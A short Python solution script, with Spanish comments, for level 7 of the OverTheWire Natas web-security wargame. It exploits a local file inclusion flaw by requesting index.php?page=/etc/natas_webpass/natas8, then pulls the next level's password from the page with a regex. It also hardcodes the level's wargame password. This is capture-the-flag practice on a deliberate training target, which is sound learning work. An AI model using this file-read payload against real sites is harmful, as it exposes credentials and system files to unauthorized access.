#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas7.py

pagina php, el codigo fuente muestra que la pass esta en
/etc/natas_webpass/natas8

se puede obtener el codigo en 
index.php?page=/etc/natas_webpass/natas8
"""
import re
import libnatas

# url: "http://natas7.natas.labs.overthewire.org"
# user: "natas7"
password = "XLoIufz83MjpTrtPvP9iAtgF48EWjicU"

natas = libnatas.NatasBrowser(level=7, password=password)

# la pass esta en index.php?page=/etc/natas_webpass/natas8
soup = natas.get_html_soup(natas.level_url + "/index.php?page=/etc/natas_webpass/natas8")
password_nl = natas.get_password(soup.prettify(), '.*\W([a-zA-Z0-9]{32})\W.*')
natas.print_password(password_nl)
